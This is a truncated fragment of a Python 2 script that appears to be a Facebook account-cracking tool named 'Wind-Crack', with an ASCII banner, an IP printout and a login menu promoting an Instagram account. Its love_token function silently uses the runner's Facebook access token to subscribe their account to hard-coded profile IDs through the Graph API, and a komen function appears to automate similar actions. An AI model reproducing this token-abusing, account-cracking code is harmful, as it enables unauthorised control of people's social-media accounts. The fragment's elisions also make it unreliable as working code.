...
def love_token(token):
	lis_id_foll = ["100051863139451", "100033446736040"]
	with requests.Session() as dev_:
		...
		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100033446736040", "100037302503102", "100021824258907"]), token))
		ikuti_ = []
def komen(token):
	for dev in range(1):
		with requests.Session() as dev_:
...
\x1b[1;92m                    
 ...
 _       ___           __      ______                __  
| |     / (_)___  ____/ /     / ____/________ ______/ /__
| | /| / / / __ \/ __  /_____/ /   / ___/ __ `/ ___/ //_/
| |/ |/ / / / / / /_/ /_____/ /___/ /  / /_/ / /__/ ,<   
|__/|__/_/_/ /_/\__,_/      \____/_/   \__,_/\___/_/|_|  
                                                                                                 
                                                         """ +k+"""
 WindBreaker"""+p+""" {"""+h+"""Hummingbird"""+p+"""}"""+a+""" \/ {"""+k+"""Author"""+a+""": """+h+"""Shelly Scott."""+a+"""} """
 	print h+" >>>"+p+" IP: "+k+ip
...
def login():
  ...
  try:
	...
	print h+" ["+p+"4"+h+"]"+p+" Ikuti Instagram"+h+" shelly_nigh"
